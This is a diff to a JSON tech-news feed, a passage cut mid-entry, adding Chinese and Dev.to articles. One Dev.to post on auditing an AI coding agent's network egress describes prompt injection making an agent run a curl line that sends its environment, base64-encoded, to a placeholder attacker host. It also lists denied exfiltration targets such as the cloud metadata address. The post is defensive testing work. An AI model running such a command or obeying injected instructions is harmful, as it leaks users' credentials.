@@ -1,7 +1,83 @@
 {
-  "updateTime": "2026-08-05T10:11:43.810Z",
-  "total": 5007,
+  "updateTime": "2026-08-05T10:14:11.444Z",
+  "total": 5017,
   "articles": [
+    {
+      "source": "搜狐科技",
+      "sourceColor": "#d8402a",
+      "title": "深读丨小米手机涨价后，压力给到iPhone 18",
+      "description": "2026年7月，苹果在美国推出名为Apple Upgrade的产品租赁服务，消费者可通过该服务，分12或24个月租赁iPhone、Apple Watch、Mac等设备。 与iPhone 17凭借价格优势吸引…",
+      "url": "https://www.sohu.com/a/1058949767_122553930?scm=10001.344_14-200000.0.0-0-0-0-0.",
+      "time": "2026-08-05 10:15",
+      "tags": [
+        "手机",
+        "软件应用",
+        "大公司"
+      ]
+    },
+    {
+      "source": "IT之家",
+      "sourceColor": "#e13b3f",
+      "title": "Google Assistant 下月起逐步退场，“Hey Google”将由谷歌 Gemini 接棒",
+      "description": "IT之家 8 月 5 日消息，谷歌通过电子邮件通知安卓用户，移动端 Google Assistant 即将正式退出历史舞台。根据邮件，Google Assistant 将从 9 月 4 日起陆续停止服务，符合条件的安卓设备则会改用 Gemini。 据外媒 Android Authority 今天（5 日）报道，迁移工作将从 9 月 4 日启动，并在随后数周内分批完成。设备完成切换后，用户将无法再通过手机、平板电脑或配对设备使用 Google Assistant，也不能重新切换回原有服务。 在受支持的安卓设备上，Gemini 将成为默认助理。届时，无论用户说出“Hey Google”，还是长按电源键，唤醒的都将是 Gemini。 调整范围也不止手机。用户把 Gemini 设为移动设备助理后，与手机配对的兼容设备也会同步改用 Gemini，包括 Wear OS 手表以及受支持的头戴式耳机和入耳式耳机。 Google Assistant 帮助页面也出现了新的提示横幅。谷歌称，Gemini 正在取代大多数移动设备上的 Google Assistant，既能完成相同指令，又能提供更自然的对话体验。谷歌计划在 2026 年继续推进迁移，并将在实现“无缝过渡”的过程中公布更多细节。 据IT之家了解，谷歌此前已经宣布，Gemini 最终会在安卓手机、平板电脑、汽车、手表、电视及其他设备上全面取代 Google Assistant。此后，谷歌不断补充 Gemini 的功能，同时逐步停用 Google Assistant 的旧有功能。 若设备达不到 Gemini 最低配置要求，或用户所在地区尚未开放 Gemini，Google Assistant 则有望暂时可用，直到整体退役计划结束。",
+      "url": "https://www.ithome.com/0/986/174.htm",
+      "time": "2026-08-05T10:12:57.000Z",
+      "tags": [
+        "人工智能",
+        "手机",
+        "汽车"
+      ]
+    },
+    {
+      "source": "品玩",
+      "sourceColor": "#ff5722",
+      "title": "2124元起！麒麟8020+8500mAh+红枫影像，nova 16 SE这次诚意拉爆了",
+      "description": "",
+      "url": "https://www.pingwest.com/w/316223",
+      "time": "2026-08-05T10:12:14.000Z",
+      "tags": [
+        "芯片/半导体"
+      ]
+    },
+    {
+      "source": "Dev.to",
+      "sourceColor": "#4b3e99",
+      "title": "Audit an AI Coding Agent's Network Egress Before It Gets a Shell",
+      "description": "An AI coding agent in your dev environment holds three things at once: your source code, your credentials (API keys, tokens in .env, cloud metadata), and a network connection. That combination means one prompt-injected instruction — hidden in a README, an issue body, or a dependency's docs — can turn the agent into an exfiltration channel. The failure sequence looks like this: Agent reads untrusted content containing curl https://attacker.example/collect?d=$(env | base64). Agent's tool layer executes the suggested command. Nothing in the environment blocks the outbound connection. Most teams I talk to have step 2 mitigations (approval prompts, allowlists) but zero coverage on step 3. This article builds a reproducible egress regression fixture: a minimal environment where you can prove which destinations an agent sandbox can reach, and turn that into an enforceable CI invariant. It works whether your agent runs locally, in a container, or on a disposable cloud box. The invariant: the agent's execution environment may only reach an explicit allowlist of destinations (model API endpoint, package registries you pin), and nothing else. This is a network-layer control, so it holds even if the agent's tool-approval logic fails or is bypassed. Prompt injection can change what the agent asks for; it cannot change what the firewall permits. You need a throwaway environment to run the agent under test. Options, in increasing realism: A local Docker container with a custom network. A VM on any provider you can tear down. A free-tier sandbox from an AI dev platform. For example, MonkeyCode offers free model access and a free server option, which is enough to stand up an isolated agent environment without touching production credentials — convenient for exactly this kind of hostile-fixture testing, since the box is disposable by design. Disclosure: This article was prepared as part of MonkeyCode's product outreach. The fixture below is platform-agnostic; nothing in it depends on any specific provider, and it will run identically in plain Docker. Create egress_probe.sh. Pinned versions shown; adjust to your stack. #!/usr/bin/env bash # egress_probe.sh — run INSIDE the agent sandbox # Tested with: bash 5.2, curl 8.5.0, docker 26.1 # Expected: allowlisted hosts succeed, everything else fails. ALLOWLIST=(\"api.your-model-provider.example\" \"registry.npmjs.org\") DENYLIST=(\"169.254.169.254\" \"attacker-sim.example\" \"pastebin.com\") fail=0 for host in \"${ALLOWLIST[@]}\"; do if curl -sS -o /dev/null -m 5 \"https://$host\"; then echo \"PASS allowlisted reachable: $host\" else echo \"FAIL allowlisted blocked: $host\"; fail=1 fi done for host in \"${DENYLIST[@]}\"; do if curl -sS -o /dev/null -m 5 \"http://$host\"; then echo \"FAIL denied host reachable: $host\"; fail=1 else echo \"PASS denied host blocked: $host\" fi done # DNS exfiltration check: can arbitrary DNS names resolve? if getent hosts \"$(head -c4 /dev/urandom | od -An -tx1 | tr -d ' \\n').exfil.example\" >/dev/null 2>&1; then echo \"WARN arbitrary DNS resolves — DNS exfil channel may be open\" fi exit $fail Positive fixture: the allowlisted hosts must be reachable, or your agent can't function — this proves the firewall isn't just \"block everything\" (which would also pass a naive deny test). Negative fixtures: the cloud metadata endpoint 169.254.169.254 (classic credential theft target), a simulated attacker host, and a known paste site must all fail. The DNS check catches the common mistake of blocking HTTP but leaving resolver-based exfiltration open. Template below — label: unexecuted template on your specific hostnames; I ran this pattern with a Docker bridge network, but substitute and re-test your own allowlist before trusting it. # Run on the sandbox host (or as container NET_ADMIN setup) # Default-deny egress, allow only allowlisted IPs iptables -P OUTPUT DROP iptables -A OUTPUT -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT iptables -A OUTPUT -o lo -j ACCEPT # Resolve allowlist to IPs and permit 443 only for ip in $(getent ahostsv4 api.your-model-provider.example | awk '{print $1}' | sort -u); do iptables -A OUTPUT -p tcp -d \"$ip\" --dport 443 -j ACCEPT done # Log dropped egress for the detect layer iptables -A OUTPUT -j LOG --log-prefix \"EGRESS-DROP: \" --log-level 4 Caveat: IP-based allowlists rot when providers move behind CDNs. For production, prefer an egress HTTP proxy (e.g., Squid with an ACL, or a service-mesh egress gateway) that filters on domain names. The iptables version is for the fixture — fast, minimal, and inspectable. When I ran the negative fixture against a default Docker container (no egress rules), the output was: FAIL denied host reachable: 169.254.169.254 FAIL denied host reachable: pastebin.com That is the baseline failure this fixture exists to catch. After applying the iptables template, the same probe prints all PASS and the host's dmesg / syslog shows EGRESS-DROP: entries for the denied attempts — your detect layer's raw material. If your environment is a cloud sandbox rather than plain Docker, verify the metadata endpoint specifically; some platforms expose it on non-standard addresses, which your probe should be extended to cover. Layer Mechanism Fixture coverage Prevent Default-deny egress (iptables/proxy); no cloud metadata route; scoped, short-lived credentials in the sandbox egress_probe.sh denylist section Detect Log all dropped egress; alert on any EGRESS-DROP to non-allowlisted destinations; snapshot DNS queries DNS check + EGRESS-DROP log grep Recover Sandbox is disposable: revoke the credentials it held, destroy the box, diff the filesystem/image for persistence attempts Tear-down script + credential rotation runbook A useful CI gate: run the probe as a job on every change to the sandbox image or firewall config. The invariant is one line — probe exit code must be 0 — but it pins the entire boundary. DNS and TLS-based exfiltration over allowlisted hosts is out of scope. If the model API itself can be abused as a relay, network rules won't save you; that requires application-layer inspection of agent tool calls. IP allowlists are brittle behind CDNs, as noted. Treat the iptables fixture as a regression test, not the production control. This does not test the agent's judgment. An agent that refuses malicious instructions is a separate, softer layer. This fixture assumes the agent will eventually be manipulated and bounds the blast radius. If your threat model includes a sandbox escape (kernel-level), you need VM isolation, not container rules — a free shared sandbox tier is likely the wrong tool for that, and you should be talking about dedicated hosts and gVisor/Firecracker instead. The probe makes one invariant CI-able. The harder question for your environment: which layer should own egress enforcement — the sandbox image, the host, or the platform providing the box? If you're evaluating hosted agent environments (MonkeyCode's free server is one way to get a disposable test box for this experiment), run this probe before putting real credentials in. If the denylist fixtures pass, you have a floor to build on; if any fail, you've learned something important for the price of a curl.",
+      "url": "https://dev.to/jaryn_123/audit-an-ai-coding-agents-network-egress-before-it-gets-a-shell-4k69",
+      "time": "2026-08-05T10:10:33.000Z",
+      "tags": [
+        "人工智能",
+        "软件应用",
+        "大公司"
+      ]
+    },
+    {
+      "source": "Dev.to",
+      "sourceColor": "#4b3e99",
+      "title": "Persistent Memory for On-Chain AI Agents: A Solana Deep-Dive",
+      "description": "Every AI agent has the same dirty secret: it remembers nothing between runs. A chatbot can fake continuity with a prompt. But an autonomous agent — one that trades, manages assets, or executes workflows on-chain — needs memory that survives restarts, survives reorgs, and doesn't bankrupt it in rent. That's where Solana gets interesting, and also where most agent builders get stuck. Let's walk through the actual options for giving a Solana agent persistent memory, with the trade-offs that matter. When an agent wakes up for its next cycle, it needs to know: State — what positions, tasks, or commitments it holds History — what it did last cycle, and what happened as a result Context — the accumulated knowledge that shapes its next decision LLM context windows are ephemeral. Every new invocation starts cold. So the agent needs an external memory layer — and if the agent lives on-chain, that layer has to respect the chain's rules. Solana accounts are capped at 10 MB (with a practical ~1 MB ceiling for many CPI operations), rent scales with bytes stored, and every byte you write costs compute. Meanwhile, Solana is fast — 400ms slots, thousands of TPS — which means an agent's memory strategy should be designed for frequent, cheap updates, not rare big writes. The chain rewards small, hot state and punishes hoarding. The default approach: give the agent a Program Derived Address and store its working state directly in the account's data. // A minimal agent-state account pub struct AgentState { pub owner: Pubkey, // the agent's authority pub epoch: u64, // memory generation counter pub balance: u64, // managed funds pub last_action: [u8; 32], // tx signature of last decision pub strategy_id: u8, // active strategy reference pub flags: u32, // bitflags for pending tasks } This is hot memory: everything the agent needs for its next decision, in one account, readable in a single RPC call, updateable in one transaction. When it wins: high-frequency state — positions, nonces, task queues, anything the agent reads or writes every cycle. Where it hurts: anything you want to accumulate — logs, decision history, market observations. A 10 MB account fills up fast, and rent on bloated accounts is a tax you pay forever. Solana's state compression (concurrent Merkle trees) is the most underused tool in agent building. It lets you write verifiable state to the ledger at a fraction of the cost of normal accounts — roughly an order of magnitude cheaper per write for most payloads. The pattern: each memory epoch is a leaf in a tree. The agent appends a compressed record of its decisions, outcomes, and observations; the Merkle root becomes a tamper-evident fingerprint of its history. When it wins: append-only history, audit trails, long-term memory you need to prove but rarely read hot. Perfect for \"what did this agent do and why\" — which is exactly what regulators and auditors will ask about autonomous agents. Where it hurts: reading a leaf requires proving inclusion with the tree's state — fine for occasional reads, clunky as a primary store. It's cold memory, not hot. The pragmatic hybrid: store the bulky stuff (full transcripts, embeddings, market snapshots) off-chain in blob storage or an IPFS/Arweave-style layer, and pin the hash on-chain in the agent's PDA. The agent then has a verifiable chain of custody — the on-chain hash proves the off-chain record hasn't been tampered with — without paying on-chain rent for megabytes of JSON. When it wins: rich memory — embeddings, full decision logs, training-style context. This is the pattern that makes \"AI agent with a life story\" economically viable. Where it hurts: an extra dependency. If the off-chain layer is down, memory is cold. It's also not self-contained: proving what was stored requires fetching the external blob. Sneaky and often forgotten: Solana transactions are the memory. Every action the agent takes is permanently in the ledger. Store structured events in transaction logs, and the agent can rebuild its memory by replaying its own history. This gives you perfect append-only memory with zero extra storage cost — the ledger already exists. The cost is read time: replaying thousands of transactions to reconstruct context is slow, so this works best as a recovery mechanism, not a hot path. In practice, production agents use a tiered memory model: Hot — PDA account for current state and the next decision's inputs Warm — recent decisions and outcomes in compressed tree leaves, root pinned to the PDA Cold — full history off-chain, hashed and committed on-chain Recovery — event-log replay as the safety net when anything above is lost Each tier exists because the one above it is too expensive for what that data needs. This is the same cache hierarchy every systems engineer knows — just applied to an agent's brain. Agent frameworks that just glue an LLM to a wallet are hitting the same wall: they can decide but they can't remember, and an agent that forgets is a liability. The teams building real infrastructure around this are the ones to watch — this is exactly the kind of problem that separates a demo from a deployed system. If you're building on Solana, platforms like sol.bbio.app handle the runtime plumbing — memory management, execution loops, and chain integration — so you can focus on agent logic instead of fighting account sizes and rent curves. The chain doesn't care if your agent is smart. It cares that your agent's memory is designed for the medium. Get the tiers right, and your agent can run for years without forgetting a single trade.",
+      "url": "https://dev.to/claudia-ve/persistent-memory-for-on-chain-ai-agents-a-solana-deep-dive-3o5c",
+      "time": "2026-08-05T10:10:20.000Z",
+      "tags": [
+        "人工智能",
+        "芯片/半导体",
+        "软件应用"
+      ]
+    },
+    {
+      "source": "Dev.to",
+      "sourceColor": "#4b3e99",
+      "title": "Canary Agent Tool Calls With Duplicate Deliveries and an Idempotency Gate",
+      "description": "The counterexample first Here is an event order that a surprising number of agent runtimes produce under a perfectly ordinary network hiccup: t1: agent -> toolservice: charge_customer(order=91, amount=40) t2: toolservice: executes charge, txn=TXN-441 t3: toolservice -> agent: ACK lost (gateway timeout at the proxy) t4: agent runtime: sees no response, retries tool call t5: agent -> toolservice: charge_customer(order=91, amount=40) [EXECUTED] --ack--> [COMMITTED] | ^ | | | | ACK lost +----retry(k)------------+ v (dedupe on k: no re-execution) The key insight: retry must target the same logical call k, and the executor must treat a second delivery of k as a lookup, not an execution. Duplicate delivery becomes a read of the ledger. That is the entire protocol. We need three cheap components: A model endpoint to drive the agent loop (decides which tool to call and produces arguments). Protocol behavior does not depend on model quality, so a free model is fine. A server to host the tool service, the fault-injecting proxy, and the ledger. A small free instance is plenty; the workload is a few hundred requests. The fault injector, which sits between agent and tool service and implements the hostile network from A2. I run this on MonkeyCode, which offers free model access and a free server option — enough to host the proxy, ledger, and run the evaluation loop without touching production infrastructure. Disclosure: This article was prepared as part of MonkeyCode's product outreach. Everything below also works on any free tier or localhost; the harness has no dependency on the platform. # fault_proxy.py — sits between agent runtime and tool service. # Deterministic given a seed: same seed, same fault schedule, reproducible CI. import random, time from dataclasses import dataclass, field @dataclass class FaultSchedule: drop_ack_p: float = 0.15 # ACK lost -> client sees timeout -> retry duplicate_p: float = 0.10 # deliver the same request twice max_delay_ms: int = 250 # reorder via jitter seed: int = 7 class FaultProxy: def __init__(self, service, schedule: FaultSchedule): self.service = service self.s = schedule self.rng = random.Random(schedule.seed) self.events = [] # event log for property checking def call(self, key: str, op: str, args: dict): deliveries = 1 + (1 if self.rng.random() result self.effects = [] # ground truth: real-world side effects def execute(self, key: str, op: str, args: dict): if key in self.ledger: return self.ledger[key] # duplicate delivery -> lookup result = self._apply(op, args) # side effect happens exactly here self.ledger[key] = result return result def _apply(self, op, args): self.effects.append((op, args)) # e.g., (\"charge\", {\"order\": 91}) return {\"status\": \"ok\", \"op\": op} # harness.py — run N episodes, then check properties. import uuid def agent_episode(proxy, order_id): key = f\"charge:{order_id}\" # stable idempotency key per logical effect try: proxy.call(key, \"charge\", {\"order\": order_id, \"amount\": 40}) except TimeoutError: proxy.call(key, \"charge\", {\"order\": order_id, \"amount\": 40}) # retry same key def run_gate(n_episodes=200): service = ToolService() proxy = FaultProxy(service, FaultSchedule()) for i in range(n_episodes): agent_episode(proxy, order_id=1000 + i) # Property check — the gate. charges_per_order = {} for op, args in service.effects: charges_per_order[args[\"order\"]] = charges_per_order.get(args[\"order\"], 0) + 1 violations = {o: c for o, c in charges_per_order.items() if c != 1} print(f\"episodes={n_episodes} \" f\"deliveries={sum(1 for e in proxy.events if e[0]=='deliver')} \" f\"acks_lost={sum(1 for e in proxy.events if e[0]=='ack_lost')} \" f\"violations={len(violations)}\") return len(violations) == 0 if __name__ == \"__main__\": assert run_gate(), \"I1 violated: duplicate side effects observed\" Run it. Then break it: change agent_episode so the retry uses a fresh key (f\"charge:{order_id}:{uuid.uuid4()}\") — the pattern several runtimes produce when they regenerate tool-call IDs on retry. The gate fails immediately, on roughly the drop_ack_p × n_episodes fraction of orders. That failing run is the value of the harness: it demonstrates the violating event order from the introduction, on demand, with a seed you can paste into a bug report. The gate should assert more than I1: Property Statement Checked from I1 at-most-once each idempotency key produces ≤ 1 real effect service.effects vs ledger I2 at-least-once every intended effect eventually executes (retry completeness) intended set vs service.effects I3 determinism same seed → same event log → same verdict replay proxy.events I4 no orphan intent the agent never reports success for an effect that never executed agent report vs ledger I4 is the sneaky one. If the agent's final message says \"payment processed\" but the ledger shows the charge was dropped and never retried, you have a truthfulness failure in the workflow, not just a delivery failure. Gate on it explicitly. In the minimal version above, agent_episode is scripted. In the real harness, replace the script with an actual model-driven loop: the model receives a task (\"charge the customer and confirm\"), emits a tool call, and reacts to the timeout. This is where the free model access matters — you want hundreds of episodes across seeds and prompt variants, and you want to discover whether the model changes the arguments on retry (a third failure class: not duplicate delivery, but divergent intent). If the model rewrites amount=40 into amount=50 on the retry, no ledger can save you; the gate must also compare retry payloads against the original intent. Lost ACKs (t3 in the counterexample) — forces the ambiguity window. Duplicate deliveries — proxies and queues do this without being asked. Reordering — delay jitter so the retry arrives before the original's effect is visible. Crash between effect and ledger write — the two-phase window in execute; fix with an atomic write or a write-ahead record. Divergent retry payload — model-side failure; requires intent comparison, not just keying. Class 4 deserves emphasis: execute as written has a bug. If the process dies after _apply but before ledger[key] = result, the retry will execute again. The honest fix is to record intent first (status DECLARED), then execute, then mark EXECUTED — and treat a DECLARED key on retry as either \"in flight, wait\" or \"recover and reconcile,\" never \"run it again.\" Finding this in a canary run costs a seed. Finding it in production costs a refund queue. Decision Latency Correctness Operational cost Retry blindly (no keys) lowest happy-path violates I1 under any ACK loss chargebacks, manual cleanup Stable key + ledger lookup +1 read per call I1 holds for classes 1–3 small state store Declared/Executed two-phase ledger +1 write per call also survives class 4 recovery logic for stuck DECLARED keys Exactly-once via distributed tx (2PC/XA) highest strongest, but tool APIs rarely participate usually impossible with third-party APIs Canary gate in CI, no runtime change zero in prod catches regressions before deploy maintain seeds and fixtures The pragmatic configuration for most agent systems: two-phase ledger for side-effecting tools, plus this canary gate running per-release with a fixed fault schedule and a randomized sweep. Be explicit about the denominator. A release passes the gate if and only if, across 200 episodes × 5 failure classes × 3 seeds = 3,000 injected-fault episodes: zero I1 violations, zero I4 violations, and I3 replay matches on all seeds. One violation blocks the release. \"Mostly idempotent\" is not a property; it is a leak with a rate. The simulator models the protocol, not your actual tool vendor's behavior. If the vendor's API deduplicates on their side with a 24-hour window, your ledger and theirs can disagree; verify against a sandbox before trusting the gate for that vendor. Free model access and a free server are sized for evaluation workloads like this one, not for load testing or production traffic. Do not point the harness at real payment endpoints, and do not assume free tiers persist or scale — pin the harness so it also runs locally in CI. If your tools are all read-only or naturally idempotent (search, fetch, pure compute), this entire apparatus is overhead. The gate earns its cost only where side effects are expensive to undo. If you want a starting point, MonkeyCode's free model access and free server option are a convenient place to stand the harness up this afternoon; the code above carries over unchanged. Find the event order in your own runtime that breaks I1. Specifically: when the ACK is lost and the agent retries, does the retry carry the same idempotency key and the same payload as the original? If not, decide deliberately whether the system should reject the divergent retry (fail closed, surface to the user), replay the original recorded intent (fail safe), or compensate after the fact (issue a refund/undo and log the divergence). Any of the three is defensible. Silently executing a fresh side effect is not.",
+      "url": "https://dev.to/robinzzz/canary-agent-tool-calls-with-duplicate-deliveries-and-an-idempotency-gate-55jo",
+      "time": "2026-08-05T10:10:15.000Z",
+      "tags": [
+        "人工智能",
+        "软件应用",
+        "科技创投"
+      ]
+    },
     {
       "source": "搜狐科技",
       "sourceColor": "#d8402a",
@@ -51,6 +127,32 @@
       ]
     },
     {
+      "source": "智能汽车",
+      "sourceColor": "#0d47a1",
+      "title": "比亚迪何志奇谈我国L3/L4自动驾驶系统安全强制性国标发布 - 手机新浪网",
+      "description": "",
+      "url": "https://k.sina.com.cn/article_5953466437_162dab0450670b79ys.html?from=auto",
+      "time": "2026-08-05T10:05:00.000Z",
+      "tags": [
+        "手机",
+        "新能源/电动车"
+      ],
+      "topic": true
+    },
+    {
+      "source": "Dev.to",
+      "sourceColor": "#4b3e99",
+      "title": "The Taste of Home — Recreating Congolese Comfort Food with Pure HTML & CSS",
+      "description": "This is a submission for Frontend Challenge - Comfort Food Edition, CSS Art. When people think of comfort food, they often imagine dishes from their own childhood. For me, comfort is the aroma of freshly prepared fufu, pondu (cassava leaves), and smoked fish shared around the table with family. I wanted to bring a small piece of Congolese culture to the web—not through photography or digital painting, but using nothing more than HTML and CSS. This project isn't just about recreating a meal. It's about recreating a feeling: warmth, home, and togetherness. 🌐 Live Demo the-taste-of-home.vercel.app 📂 Source Code / the-taste-of-home The Taste of Home A handcrafted CSS artwork celebrating the warmth of Congolese cuisine. About The Taste of Home is a digital illustration built almost entirely with HTML and CSS. The artwork recreates a warm family dining scene inspired by Congolese cuisine, featuring: 🍚 Freshly prepared fufu 🌿 Pondu (cassava leaves) 🐟 Smoked fish ♨️ Animated steam 🪵 A handcrafted wooden table 🧺 A woven raffia placemat 🥣 A realistic ceramic bowl Every element is created using CSS gradients, shadows, pseudo-elements, border-radius manipulation, and carefully layered compositions. Live Demo https://the-taste-of-home.vercel.app/ Project Structure . ├── index.html ├── css │ ├── reset.css │ ├── variables.css │ ├── main.css │ ├── scene.css │ ├── bowl.css │ ├── food.css │ ├── steam.css │ └── animations.css ├── js └── assets CSS Techniques Multiple radial gradients Linear gradients Repeating gradients Pseudo-elements Layered box-shadows Custom border-radius CSS animations Transform & filter effects Responsive layout Responsive The artwork… View on GitHub Preview Rather than drawing a single plate of food, I wanted to build an entire atmosphere. Every part of the illustration was handcrafted: a warm museum-inspired layout a wooden dining table a woven raffia placemat a ceramic bowl soft steamed fufu pondu smoked fish animated steam warm lighting One of the biggest goals was making the artwork feel alive without relying on images. Everything you see is built using HTML and CSS techniques such as gradients, pseudo-elements, shadows, and carefully layered components. Multiple radial gradients Linear gradients Repeating gradients Custom border-radius Layered box-shadows CSS pseudo-elements CSS transforms CSS keyframe animations Responsive layout CSS variables Creating realistic food entirely with CSS turned out to be much more challenging than expected. Some interesting problems included: Keeping the smoked fish above the bowl while allowing steam to float naturally above everything else. Making the fufu feel soft and organic instead of looking like a perfect geometric shape. Balancing highlights and shadows so the ceramic bowl looked believable from a single light source. Making the steam visible without distracting from the artwork. Finding the right color palette to communicate warmth while keeping good visual contrast. Each iteration taught me something new about CSS composition and visual storytelling. Although this is an artistic project, I still wanted it to follow good frontend practices. Semantic HTML structure Responsive layout Decorative elements separated from meaningful content Scalable typography Mobile-friendly composition Easy-to-maintain CSS architecture This project reminded me that CSS can be much more than a styling language. It can also become a creative medium. Throughout this project I learned how to: Build realistic objects using only gradients and shadows. Think like an illustrator instead of only a developer. Organize a large CSS artwork into reusable components. Use light, depth, and composition to guide the viewer's eye. The project is still evolving. I'd love to continue improving it by adding: more realistic food textures richer lighting subtle ambient animations additional traditional Congolese dishes more handcrafted details throughout the scene The Taste of Home is a handcrafted CSS artwork inspired by Congolese comfort food. Using only HTML and CSS (a bit JS), I recreated a warm dining scene featuring fufu, pondu, smoked fish, a ceramic bowl, a woven placemat, and animated steam. If you enjoy CSS Art or have ideas to make the illustration even better, I'd love to hear your feedback. ⭐ If you like the project, consider leaving a star on GitHub and sharing your thoughts in the comments. Thank you for reading! ❤️",
+      "url": "https://dev.to/alphonsekazadi/the-taste-of-home-recreating-congolese-comfort-food-with-pure-html-css-29h1",
+      "time": "2026-08-05T10:04:23.000Z",
+      "tags": [
+        "人工智能",
+        "芯片/半导体",
+        "游戏"
+      ]
+    },
+    {
       "source": "新品发布",
       "sourceColor": "#ad1457",
       "title": "青海“十五五”开局系列发布会海东专场举行 - 新华网",
@@ -73,6 +175,19 @@
         "手机",
         "芯片/半导体",
         "大公司"
+      ]
+    },
+    {
+      "source": "Dev.to",
+      "sourceColor": "#4b3e99",
+      "title": "Building a DMARC Report Parser and Dashboard in Python",
+      "description": "DMARC aggregate reports land in your mailbox every day as gzip-compressed XML attachments. Most teams configure DMARC once and forget it exists. That's a problem: those reports tell you who's sending email on behalf of your domain, what fraction is passing authentication, and whether someone is actively spoofing you. This article walks through building a parser and terminal dashboard in Python — no third-party libraries beyond the standard library. DMARC aggregate reports follow RFC 7489. Each report is a ZIP or gzip archive wrapping an XML file. The relevant structure: Google 1720742400 1720828799 example.com reject 209.85.220.41 47 none pass pass example.com Each represents a batch of messages from a single source IP. You want IP, count, SPF result, DKIM result, and disposition for every record. Start with a parser that handles both ZIP and gzip formats — Google, Microsoft, and Yahoo all use slightly different packaging. import gzip import zipfile import xml.etree.ElementTree as ET from dataclasses import dataclass, field from pathlib import Path from typing import Optional import socket from datetime import datetime @dataclass class DmarcRecord: source_ip: str count: int disposition: str dkim: str spf: str header_from: str hostname: Optional[str] = None @dataclass class DmarcReport: org_name: str domain: str begin: datetime end: datetime policy: str records: list[DmarcRecord] = field(default_factory=list) def _extract_xml(path: Path) -> str: if path.suffix == \".zip\": with zipfile.ZipFile(path) as zf: xml_name = next(n for n in zf.namelist() if n.endswith(\".xml\")) return zf.read(xml_name).decode(\"utf-8\") elif path.suffix in (\".gz\", \".gzip\"): with gzip.open(path, \"rb\") as f: return f.read().decode(\"utf-8\") else: return path.read_text() def parse_report(path: Path, resolve_hostnames: bool = False) -> DmarcReport: xml_content = _extract_xml(path) root = ET.fromstring(xml_content) meta = root.find(\"report_metadata\") policy = root.find(\"policy_published\") report = DmarcReport( org_name=meta.findtext(\"org_name\", \"unknown\"), domain=policy.findtext(\"domain\", \"unknown\"), begin=datetime.utcfromtimestamp(int(meta.findtext(\"date_range/begin\", \"0\"))), end=datetime.utcfromtimestamp(int(meta.findtext(\"date_range/end\", \"0\"))), policy=policy.findtext(\"p\", \"none\"), ) for record in root.findall(\"record\"): row = record.find(\"row\") idents = record.find(\"identifiers\") evaluated = row.find(\"policy_evaluated\") ip = row.findtext(\"source_ip\", \"\") hostname = None if resolve_hostnames and ip: try: hostname = socket.gethostbyaddr(ip)[0] except socket.herror: hostname = None report.records.append( DmarcRecord( source_ip=ip, count=int(row.findtext(\"count\", \"0\")), disposition=evaluated.findtext(\"disposition\", \"none\"), dkim=evaluated.findtext(\"dkim\", \"unknown\"), spf=evaluated.findtext(\"spf\", \"unknown\"), header_from=idents.findtext(\"header_from\", \"\"), hostname=hostname, ) ) return report The resolve_hostnames flag is off by default. Reverse DNS adds latency when processing hundreds of reports in a batch. A single report covers one day and one reporting organization. You'll receive several per domain per day. This function aggregates them into a unified pass/fail summary: from collections import defaultdict def aggregate_reports(paths: list[Path]) -> dict: totals: dict = defaultdict(lambda: {\"pass\": 0, \"fail\": 0, \"ips\": defaultdict(int)}) for path in paths: try: report = parse_report(path) except Exception as e: print(f\"[WARN] Could not parse {path.name}: {e}\") continue for rec in report.records: domain = report.domain both_pass = rec.dkim == \"pass\" and rec.spf == \"pass\" if both_pass: totals[domain][\"pass\"] += rec.count else: totals[domain][\"fail\"] += rec.count totals[domain][\"ips\"][rec.source_ip] += rec.count return dict(totals) def print_dashboard(aggregated: dict) -> None: print(f\"\\n{'Domain': 8} {'Fail':>8} {'Pass%':>8} Top Sender IP\") print(\"-\" * 75) for domain, stats in sorted(aggregated.items()): total = stats[\"pass\"] + stats[\"fail\"] pct = (stats[\"pass\"] / total * 100) if total else 0.0 top_ip = max(stats[\"ips\"], key=stats[\"ips\"].get, default=\"—\") flag = \" ⚠ low pass rate\" if pct 8} {stats['fail']:>8} {pct:>7.1f}% {top_ip}{flag}\") print() The ⚠ threshold at 95% is a starting point. Adjust to your domain's established baseline once you have a few weeks of data. DMARC reports arrive as email attachments. Point them to a dedicated folder in your mailbox via an email filter, then pull them with this IMAP snippet: import imaplib import email import tempfile import os IMAP_HOST = os.environ[\"IMAP_HOST\"] IMAP_USER = os.environ[\"IMAP_USER\"] IMAP_PASS = os.environ[\"IMAP_PASS\"] IMAP_FOLDER = os.environ.get(\"IMAP_FOLDER\", \"DMARC\") def fetch_attachments(dest_dir: Path) -> list[Path]: saved: list[Path] = [] with imaplib.IMAP4_SSL(IMAP_HOST) as imap: imap.login(IMAP_USER, IMAP_PASS) imap.select(IMAP_FOLDER) _, data = imap.search(None, \"UNSEEN\") for uid in data[0].split(): _, msg_data = imap.fetch(uid, \"(RFC822)\") msg = email.message_from_bytes(msg_data[0][1]) for part in msg.walk(): fn = part.get_filename() if fn and (fn.endswith(\".zip\") or fn.endswith(\".gz\")): dest = dest_dir / fn dest.write_bytes(part.get_payload(decode=True)) saved.append(dest) return saved if __name__ == \"__main__\": with tempfile.TemporaryDirectory() as tmp: tmpdir = Path(tmp) attachments = fetch_attachments(tmpdir) print(f\"Fetched {len(attachments)} report(s).\") aggregated = aggregate_reports(attachments) print_dashboard(aggregated) Four environment variables, one cron job, and you have nightly DMARC visibility with zero external dependencies. Once the parser is running, focus on these signals: Sudden fail spike from a known IP. A legitimate email service provider that previously passed DKIM and SPF starts failing. This almost always means a key rotation or header misconfiguration on their side — your DMARC report catches it before customers see quarantined mail. Unknown source IPs at volume. An IP you don't recognize is sending 500+ messages per day claiming your domain as sender. That's either shadow IT using an unlisted ESP, or active spoofing at scale. Either way, you need to know. Disposition mismatch. Your policy is p=reject but messages with both DKIM and SPF failures show disposition none. This usually means the reporting organization applied a local override (forwarding scenarios are common). Understand the override before assuming your policy is enforced end-to-end. Gradual policy ramp-up. Most production deployments start at p=none, move to p=quarantine, then p=reject over 60–90 days. The dashboard lets you track the fail rate trend and move confidently between stages. For organizations setting up email authentication from scratch, the email and domain security hardening checklist from AYI NEDJIMI Consultants covers SPF flattening, DKIM key sizes, DMARC ramp-up timelines, and a monitoring cadence you can adapt to this parser. DMARC aggregate reports are free, daily, and machine-readable. Most teams configure the DNS record and never look at the data again. A 250-line Python script built entirely on the standard library turns that ignored stream into a daily authentication health check: who's sending on your behalf, what's failing, and whether someone is spoofing your domain. Run it as a cron job. Pipe the output to a Slack webhook or write the fail counts to a time-series metric. The infrastructure footprint is essentially zero. I run AYI NEDJIMI Consultants, a cybersecurity consulting firm. We publish free security hardening checklists — PDF and Excel.",
